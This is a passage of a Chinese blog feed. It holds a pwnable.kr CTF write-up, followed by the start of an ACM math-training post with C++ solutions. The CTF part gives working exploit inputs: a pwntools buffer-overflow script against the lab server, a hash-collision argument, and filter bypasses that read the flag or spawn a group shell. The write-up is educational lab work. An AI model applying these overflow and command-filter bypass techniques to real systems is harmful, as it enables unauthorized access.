class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</div><div class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</div><div class="line">        len = read(fd, buf, <span class="number">32</span>);</div><div class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</div><div class="line">                system(<span class="string">"/bin/cat flag"</span>);</div><div class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>程序里用到的<em>file descriptor</em>竟然不是<em>open</em>返回的，而是根据命令行参数变换出来的，也就是说要给出一个数字，使得这个数字作为文件描述符对应的文件里的内容是特定的字符串。这在正常情况下是不可能的，因为一个文件的文件描述符只在同一个进程里是确定的，更何况当前用户也不能新建文件。但是UNIX下确实有三个文件的文件描述符是<strong>绝对确定</strong>的，它们就是 stdin stdout stderr 。所以只要让<code>fd</code>变量等于<strong>0</strong>，我们就可以输入任意的内容，我觉得至少有三种方法：</p><ol><li>非常普通的输入0x1234对应的十进制数，<code>./fd 4660</code></li><li><p>看起来太fancy但是实际上非常有用的命令，涉及到shell语言的弱引用以及python的命令行执行字符串</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./fd `python -c <span class="string">"print 0x1234"</span>`</div></pre></td></tr></table></figure></li><li><p>gdb可用，应该可以直接set fd甚至set buf（没有实际尝试）</p></li></ol><p>最后把打出来的内容贴到网站上这题就通过了。</p><h3 id="0x01-collision"><a href="#0x01-collision" class="headerlink" title="0x01 collision"></a>0x01 collision</h3><p>权限控制和目标之类的跟上一题都是一样的，之后都省略了。<br>home目录提供了可执行程序和C语言源程序，先看一下源程序：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</div><div class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</div><div class="line">        <span class="keyword">int</span> i;</div><div class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</div><div class="line">                res += ip[i];</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</div><div class="line">                system(<span class="string">"/bin/cat flag"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">                <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>首先看到用法是命令行加一个字符串参数执行，字符串长度等于20才会进行之后的操作。然后看到check_password里面其实就是把4个char拼成1个int并全加起来。其实我们只需要4个就能控制最终结果，又因为\x00是C语言的字符串结束标志，我们可以前16个字节全都填\x01，然后计算一下最后4个字节应该是什么，注意一下小端序就可以。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./col `python -c <span class="string">"print '\x01'*16 + '\xe8\x05\xd9\x1d'"</span>`</div></pre></td></tr></table></figure></p><p><em>NOTE: 最开始以为都要可打印字符暴力了很久。。。其实大概只要不包含控制字符就可以了？</em></p><h3 id="0x02-bof"><a href="#0x02-bof" class="headerlink" title="0x02 bof"></a>0x02 bof</h3><p>先把文件下载下来，稍微检查一下。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">➜  Documents checksec bof</div><div class="line">[*] <span class="string">'/home/zyyyyy/Documents/bof'</span></div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div></pre></td></tr></table></figure></p><p>源代码里有一个gets函数可以溢出。虽然开了金丝雀，反正还是拖进IDA看一看。一看，相对ebp寻址，那么首先输入偏移量这么多的字符，再输入4个字符覆盖栈中存的ebp，再输入4个字符覆盖栈中的返回地址，最后输入4个字符覆盖函数的第一个参数也就是key。这些可以参考<a href="/blog/2018/07/19/c-stack-frame/">C语言函数调用栈（一）</a>。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">sh = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9000</span>)</div><div class="line">payload = <span class="string">'a'</span>*<span class="number">0x2c</span> + <span class="string">'bbbb'</span> + <span class="string">'rrrr'</span> + p32(<span class="number">0xcafebabe</span>)</div><div class="line">sh.sendline(payload)</div><div class="line">sh.interactive()</div></pre></td></tr></table></figure></p><p>至于金丝雀为什么没有起作用其实从汇编层面更明显一点，实际上直到这个函数将要return的时候才会检查金丝雀值，然而程序执行到if然后马上又执行了一个system，也就是说在我们获得shell的时候还没金丝雀啥事，所以当然就可以啦。</p><h3 id="0x03-flag"><a href="#0x03-flag" class="headerlink" title="0x03 flag"></a>0x03 flag</h3><p>执行一下，就输出一句话，也不接收什么东西。。。<br>刚开始直接扔IDA了。。。然后看到了一大堆乱七八糟的东西。。。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">➜  Documents checksec flag </div><div class="line">[*] <span class="string">'/home/zyyyyy/Documents/flag'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">    RWX:      Has RWX segments</div><div class="line">    Packer:   Packed with UPX</div></pre></td></tr></table></figure></p><p>可以发现最下面出现一个packer，查一查UPX，开源软件而且可以直接apt装，装完以后解包再看。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">➜  Documents upx <span class="_">-d</span> flag         </div><div class="line">                       Ultimate Packer <span class="keyword">for</span> eXecutables</div><div class="line">                          Copyright (C) 1996 - 2013</div><div class="line">UPX 3.91        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Sep 30th 2013</div><div class="line"></div><div class="line">        File size         Ratio      Format      Name</div><div class="line">   --------------------   ------   -----------   -----------</div><div class="line">    887219 &lt;-    335288   37.79%  linux/ElfAMD   flag</div><div class="line"></div><div class="line">Unpacked 1 file.</div><div class="line">➜  Documents checksec flag       </div><div class="line">[*] <span class="string">'/home/zyyyyy/Documents/flag'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div></pre></td></tr></table></figure></p><p>正常了，再扔IDA里面，F5看了半天。后来觉得应该看一下所有string(Shift+F12)，第一行就出现了UPX，长得就像flag，提交一下果然对了。对了之后再看，发现在汇编界面main函数puts往下第四行赫然就写着cs:flag。。。猜测是因为用了静态链接，导致IDA反编译输出的代码非常复杂，啥都看不太懂。。。<br><em>NOTE: 不能总是一上来就F5，不仅没啥提高还会导致丢失一些信息。。。</em></p><h3 id="0x05-random"><a href="#0x05-random" class="headerlink" title="0x05 random"></a>0x05 random</h3><p>有源代码直接看源代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> random;</div><div class="line">random = rand();        <span class="comment">// random value!</span></div></pre></td></tr></table></figure></p><p>显然<code>rand()</code>产生的是伪随机数，且不播种种子就是0，可以写个python算出应该输入的值<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>libc = cdll.LoadLibrary(<span class="string">"libc.so.6"</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = libc.rand()                                                             </div><div class="line"><span class="meta">&gt;&gt;&gt; </span>x = r ^ <span class="number">0xdeadbeef</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> x</div><div class="line"><span class="number">3039230856</span></div></pre></td></tr></table></figure></p><h3 id="0x08-mistake"><a href="#0x08-mistake" class="headerlink" title="0x08 mistake"></a>0x08 mistake</h3><p>直接看源代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> fd;</div><div class="line"><span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">printf</span>(<span class="string">"do not bruteforce...\n"</span>);</div><div class="line">sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</div><div class="line"></div><div class="line"><span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</div><div class="line"><span class="keyword">int</span> len;</div><div class="line"><span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"read error\n"</span>);</div><div class="line">        close(fd);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>显然两个<code>if</code>处都有优先级的问题，会先进行&lt;&gt;的运算再进行赋值，所以在文件存在的情况下fd一定等于0，也就是一定从stdin读入。根据后面的逻辑，即输入两个串使得第一个串异或1之后等于第二个串就可以了，例如<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0123456789</div><div class="line">1032547698</div></pre></td></tr></table></figure></p><h3 id="0x0d-cmd1"><a href="#0x0d-cmd1" class="headerlink" title="0x0d cmd1"></a>0x0d cmd1</h3><p>整个程序先putenv设置环境变量，然后filter过滤，最后由system函数执行。<br>虽然设置了环境变量，但只要使用绝对路径一样可以调用。<br>至于过滤也很好绕过。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./cmd1 <span class="string">"/bin/cat f''lag"</span> <span class="comment"># 加分隔符</span></div><div class="line">./cmd1 <span class="string">"/bin/cat f*"</span> <span class="comment"># 用通配符</span></div></pre></td></tr></table></figure></p><p>同理其实也可以进入cmd1_pwn组的shell<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./cmd1 <span class="string">"/bin/s''h"</span> <span class="comment"># 加分隔符</span></div></pre></td></tr></table></figure></p><h3 id="0x13-blukat"><a href="#0x13-blukat" class="headerlink" title="0x13 blukat"></a>0x13 blukat</h3><p>描述非常神奇的一道题，做法也很神奇。<br>登录上去以后看了一下代码，需要输入一个串使得跟password相等<br>查看一下权限，跟其他的题是一样的<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">blukat@ubuntu:~$ ls -alh</div><div class="line">total 36K</div><div class="line">drwxr-x---  4 root blukat     4.0K Aug 15 22:55 .</div><div class="line">drwxr-xr-x 93 root root       4.0K Oct 10 22:56 ..</div><div class="line">dr-xr-xr-x  2 root root       4.0K Aug 15 22:55 .irssi</div><div class="line">drwxr-xr-x  2 root root       4.0K Aug 15 22:55 .pwntools-cache</div><div class="line">-r-xr-sr-x  1 root blukat_pwn 9.0K Aug  8 06:44 blukat</div><div class="line">-rw-r--r--  1 root root        645 Aug  8 06:43 blukat.c</div><div class="line">-rw-r-----  1 root blukat_pwn   33 Jan  6  2017 password</div></pre></td></tr></table></figure></p><p>尝试一下查看password<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">blukat@ubuntu:~$ cat password</div><div class="line">cat: password: Permission denied</div></pre></td></tr></table></figure></p><p>看上去就像个权限不够的提示，但是实际上用more/less/vim就会发现问题。。。<br>其实这句话就是password文件的全部内容。。。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">blukat@ubuntu:~$ id</div><div class="line">uid=1104(blukat) gid=1104(blukat) groups=1104(blukat),1105(blukat_pwn)</div></pre></td></tr></table></figure></p><p><em>NOTE: 这个题目告诉我们当前的身份很重要，包括group权限！</em></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x0-Toddler’s-Bottle&quot;&gt;&lt;a href=&quot;#0x0-Toddler’s-Bottle&quot; class=&quot;headerlink&quot; title=&quot;0x0 Toddler’s Bottle&quot;&gt;&lt;/a&gt;0x0 Toddler’s Bottle&lt;/h2&gt;&lt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.smlight.xyz/tags/CTF/"/>
    
      <category term="PWN" scheme="https://www.smlight.xyz/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>HHUACM 暑假专题 数学</title>
    <link href="https://www.smlight.xyz/2018/09/02/hhutraining4/"/>
    <id>https://www.smlight.xyz/2018/09/02/hhutraining4/</id>
    <published>2018-09-02T13:45:45.000Z</published>
    <updated>2018-09-02T13:46:29.541Z</updated>
    
    <content type="html"><![CDATA[<h3 id="A-求递推序列的第N项"><a href="#A-求递推序列的第N项" class="headerlink" title="A - 求递推序列的第N项"></a><a href="https://vjudge.net/problem/51Nod-1126" target="_blank" rel="noopener">A - 求递推序列的第N项</a></h3><p>矩阵快速幂，帮助大家搭建/测试自己的模板。<br>简单地讲一下原理，可以看到每一项用到了前两项的值，首先构造一个二维的向量$\left(\begin{matrix}<br>f(i-1) \\<br>f(i-2) \\<br>\end{matrix}\right)$，如果有常数就再加一维。那么将这个向量作为自变量，下一项就是$\left(\begin{matrix}<br>f(i) \\<br>f(i-1) \\<br>\end{matrix}\right)$。最后稍微动一下脑子配一个$2\times2$的系数矩阵使得$Cx_{i-1}=x_{i}$：<br>$$\left(\begin{matrix}<br>A &amp; B \\<br>1 &amp; 0 \\<br>\end{matrix}\right)<br>\left(\begin{matrix}<br>f(i-1) \\<br>f(i-2) \\<br>\end{matrix}\right)<br>=\left(\begin{matrix}<br>f(i) \\<br>f(i-1) \\<br>\end{matrix}\right)$$<br>复杂度$O(M^3logN)$，其中$M$为矩阵的大小，等于$2$。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> MO=<span class="number">7</span>;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> Matrix &#123;</div><div class="line">    <span class="keyword">int</span> r,c;</div><div class="line">    ll e[<span class="number">2</span>][<span class="number">2</span>];</div><div class="line">    Matrix() &#123;&#125;</div><div class="line">    Matrix(<span class="keyword">int</span> _r,<span class="keyword">int</span> _c) &#123;</div><div class="line">        r=_r;c=_c;</div><div class="line">        <span class="built_in">memset</span>(e,<span class="number">0</span>,<span class="keyword">sizeof</span>(e));</div><div class="line">    &#125;</div><div class="line">    Matrix(ll x) &#123;</div><div class="line">        r=c=<span class="number">2</span>;</div><div class="line">        <span class="built_in">memset</span>(e,<span class="number">0</span>,<span class="keyword">sizeof</span>(e));</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;r;i++) &#123;</div><div class="line">            e[i][i]=x;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    Matrix <span class="keyword">operator</span> *(<span class="keyword">const</span> Matrix &amp;b) &#123;</div><div class="line">        <span class="function">Matrix <span class="title">C</span><span class="params">(r,b.c)</span></span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;r;i++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;b.c;j++) &#123;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;c;k++) &#123;</div><div class="line">                    C.e[i][j]+=e[i][k]*b.e[k][j]%MO;</div><div class="line">                    <span class="keyword">if</span> (C.e[i][j]&gt;=MO) C.e[i][j]%=MO;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> C;</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function">Matrix <span class="title">fpow</span><span class="params">(Matrix x,ll n)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="function">Matrix <span class="title">res</span><span class="params">(<span class="number">1</span>)</span></span>;</div><div class="line">    <span class="keyword">while</span> (n) &#123;</div><div class="line">        <span class="keyword">if</span> (n&amp;<span class="number">1</span>) &#123;</div><div class="line">            res=res*x;</div><div class="line">        &#125;</div><div class="line">        x=x*x;</div><div class="line">        n&gt;&gt;=<span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> a,b,n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;a,&amp;b,&amp;n);</div><div class="line">    <span class="keyword">if</span> (n&lt;=<span class="number">2</span>) &#123;</div><div class="line">        <span class="built_in">puts</span>(<span class="string">"1"</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        Matrix A(<span class="number">2</span>,<span class="number">2</span>);</div><div class="line">        A.e[<span class="number">0</span>][<span class="number">0</span>]=a;</div><div class="line">        A.e[<span class="number">0</span>][<span class="number">1</span>]=b;</div><div class="line">        A.e[<span class="number">1</span>][<span class="number">0</span>]=<span class="number">1</span>;</div><div class="line">        A.e[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">0</span>;</div><div class="line">        <span class="function">Matrix <span class="title">X</span><span class="params">(<span class="number">2</span>,<span class="number">1</span>)</span></span>;</div><div class="line">        X.e[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</div><div class="line">        X.e[<span class="number">1</span>][<span class="number">0</span>]=<span class="number">1</span>;</div><div class="line">        A=fpow(A,n<span class="number">-2</span>);</div><div class="line">        X=A*X;</div><div class="line">        <span class="keyword">int</span> ans=(X.e[<span class="number">0</span>][<span class="number">0</span>]%MO+MO)%MO;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="B-Kinds-of-Fuwas"><a href="#B-Kinds-of-Fuwas" class="headerlink" title="B - Kinds of Fuwas"></a><a href="https://vjudge.net/problem/ZOJ-2975" target="_blank" rel="noopener">B - Kinds of Fuwas</a></h3><p>题意：四个角为同一种福娃的子矩形有多少个？<br>题解：从样例可以看出，一行或一列的矩形都不算。从数据范围来看，直接四个循环复杂度太高了，但是每个元素的值域很小，只有五个种类，所以可以考虑枚举每个种类来做。对于每个种类，比如<code>H</code>，我们可以利用类似最大子矩阵的套路，枚举两行作为上下界，然后再枚举每一列，对上下都是<code>H</code>的列进行计数，在这之中任取两列就是符合要求的矩形，所以把答案加上$C^{2}_{m}$即可，这个组合数可以$O(1)$求得。<br>复杂度$(KM^2N)$，其中$K$等于$5$。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">char</span> PP[<span class="number">9</span>]=<span class="string">"BJHYN"</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">256</span>;</div><div class="line"><span class="keyword">char</span> mp[N][N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="keyword">int</span> n,m;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%s"</span>,mp[i]);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> p=<span class="number">0</span>;p&lt;<span class="number">5</span>;p++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;n;j++) &#123;</div><div class="line">                    <span class="keyword">int</span> t=<span class="number">0</span>;</div><div class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;m;k++) &#123;</div><div class="line">                        <span class="keyword">if</span> (mp[i][k]==PP[p]&amp;&amp;mp[j][k]==PP[p]) ++t;</div><div class="line">                    &#125;</div><div class="line">                    ans+=t*(t<span class="number">-1</span>)/<span class="number">2</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="C-GCD-is-Funny"><a href="#C-GCD-is-Funny" class="headerlink" title="C - GCD is Funny"></a><a href="https://vjudge.net/problem/HDU-5902" target="_blank" rel="noopener">C - GCD is 